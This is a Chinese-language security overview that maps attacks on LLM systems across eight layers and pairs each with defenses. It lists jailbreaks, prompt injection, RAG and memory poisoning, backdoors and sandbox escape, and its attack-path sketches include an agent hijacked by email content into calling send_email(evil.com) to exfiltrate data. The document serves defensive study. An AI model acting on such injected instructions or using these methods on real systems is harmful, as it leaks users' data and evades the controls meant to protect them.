# LLM 系统攻击面：L1–L8 分层详图

> 从"一次用户请求穿越整个 LLM 系统"的视角，逐层标记攻击点与根因。
> 本文件是 `llm-security/` 方向的组织骨架。

---

## 总览

```
  用户/攻击者
      │
      ▼
  L1  输入层                      原始 prompt / 多模态附件
      │
      ▼
  L2  预处理层                    过滤 / 分类 / PII 脱敏
      │
      ▼
  L3  上下文组装层  ⭐            system + user + RAG + tool + history
      │
      ▼
  L4  模型推理层                  LLM 本体：对齐 / 权重 / 解码
      │
      ▼
  L5  输出层                      文本 / 工具调用 JSON
      │
      ▼
  L6  Agent/Tool 执行层  ⭐       工具调用 / 代码执行 / IO
      │
      ▼
  L7  基础设施层                  沙箱 / OS / 凭证 / 权重
      │
      ▼
  L8  反馈回流层                  日志 / RLHF / 记忆 / 再训练
```

---

## 各层详解

### L1 — 输入层

**攻击面**
- 越狱 prompt（DAN / role-play / 改写）
- 编码绕过（Base64 / ROT13 / ASCII art）
- 低资源语言攻击
- 多模态注入（图片/音频里藏指令）
- 超长输入耗尽上下文

**根因**：语义边界 ≠ 字符串边界；对齐训练分布有限。

---

### L2 — 预处理层

**攻击面**
- 过滤器对抗样本（同义改写通过检测）
- 分类器假阴性
- 归一化不一致（NFKC、Unicode 技巧）
- PII 脱敏被诱导还原

**根因**：分类器本身是概率模型，也是软边界。

---

### L3 — 上下文组装层 ⭐ 最大攻击面

```
   System      User        RAG         Tool        History
   Prompt  +  Input   +  Retrieval +  Return   +   Memory
      │         │          │             │             │
      └─────────┴──────────┴─────────────┴─────────────┘
                            ▼
                  拼接成同一个 context
```

**攻击面**
- Prompt Injection（直接 / 间接）
- 文档 / 网页埋指令
- RAG 污染（索引投毒）
- 历史记忆投毒（多轮累积）
- 角色伪造（伪造 system/assistant 消息）
- 长上下文稀释
- Many-shot Jailbreak

**根因**：**数据 ≡ 指令**（冯·诺依曼问题的 AI 版）；无特权分级。

---

### L4 — 模型推理层

**攻击面**
- 对齐失效（分布外样本）
- Fine-tuning 去对齐
- 后门 / Sleeper Agent
- 模型窃取（API 蒸馏）
- 训练数据提取（memorization）
- 成员推断
- 解码参数利用（temperature / top-p）
- 侧信道（时延、token 数、logprobs）

**根因**：对齐是"参数偏移"而非"硬规则"；训练数据不可擦除。

---

### L5 — 输出层

**攻击面**
- 输出注入（HTML / Markdown XSS）
- 恶意链接 / 图片 URL 带外泄露
- 幻觉 URL / 包名投毒 (slopsquatting)
- 结构化输出字段欺骗
- 输出分类器绕过

**根因**：LLM 输出直接进入渲染 / 下游系统；缺少输出侧的信任边界。

---

### L6 — Agent / Tool 执行层 ⭐ 危害放大器

```
  LLM 决策 ──▶ 工具调用 ──▶ 真实世界副作用
```

**攻击面**
- Confused Deputy（借用户凭证作恶）
- 工具参数注入（SQL / 命令 / 路径遍历）
- 未授权工具调用
- 多步累积误差
- 循环 / 预算耗尽
- 跨 agent 权限借用
- 外部内容触发的链式劫持

**根因**：LLM 不能跨步维持精确安全不变量；工具赋予了"手脚"，把概率错误变物理后果。

---

### L7 — 基础设施层

**攻击面**
- 沙箱逃逸（code interpreter）
- 凭证泄露（env / token / key）
- 模型权重窃取
- 推理框架漏洞（vLLM / Triton CVE）
- 训练管线投毒
- 供应链攻击（依赖包、数据源）
- GPU / KV-cache 侧信道

**根因**：传统系统安全问题在 AI 栈里重演；叠加 AI 特有资产（权重、数据）。

---

### L8 — 反馈回流层

**攻击面**
- RLHF 标注污染
- 用户反馈投毒（点赞恶意回答）
- 长期记忆污染
- 日志回灌训练集（self-poisoning）
- 对齐退化（多轮微调后安全性下降）

**根因**：今天的输入 = 明天的训练数据，形成闭环攻击路径。

---

## 典型攻击路径

### 路径 A：经典提示注入

```
攻击者埋指令 → L3 上下文组装 → L4 模型当指令执行
            → L5 异常输出 → L6 工具调用 → 💥
```

### 路径 B：Agent 借权链式攻击

```
用户请求正常 → L1 输入含恶意邮件内容
           → L3 邮件被当指令 → L4 服从
           → L6 调用 send_email(evil.com)
           → L7 凭证有效 → 💥 数据外泄
```

### 路径 C：长期记忆投毒

```
Day 1: 攻击者对话 → L8 写入记忆"用户允许分享密码"
Day N: 正常对话 → L3 读取污染记忆 → L4 基于"事实"决策 → 💥
```

### 路径 D：供应链 + 后门

```
L8 训练阶段毒化 → L7 权重含后门 → L1 触发 trigger
               → L4 特定恶意行为 → 💥
```

---

## 攻防层级映射

| 层 | 典型攻击 | 对应防御（确定性优先） |
|----|---------|----------------------|
| L1 | 越狱 / 编码绕过 | 输入分类器 + 归一化 + 多语种对齐 |
| L2 | 过滤器对抗 | 多分类器集成 + 规则兜底 |
| L3 | Prompt Injection / RAG 污染 | **Spotlighting / StruQ / CaMeL**、信任边界标注、来源隔离 |
| L4 | 对齐失效 / 后门 | 对抗训练、Red-teaming、后门检测 |
| L5 | 输出注入 / 幻觉链接 | 输出渲染消毒、URL/包名白名单 |
| L6 | 工具劫持 | **最小权限、参数白名单、人工确认、预算上限** |
| L7 | 沙箱逃逸 / 供应链 | 容器化、seccomp、SBOM、权重签名 |
| L8 | 反馈投毒 | 反馈审计、异常检测、记忆可追溯 |

---

## 核心规律（写给自己和未来的 agent）

1. **上层攻击（L3/L4）防不胜防**——概率模型里没有硬边界。
2. **下层防御（L6/L7）必须收紧**——这是把概率错误兜成"有限危害"的唯一方法。
3. **最有效的防御 = 把安全决策从 L3/L4 挪到 L6/L7**。
4. **绝不让 LLM 独自做精确判断**——身份、权限、算数、匹配，全部外包给确定性组件。
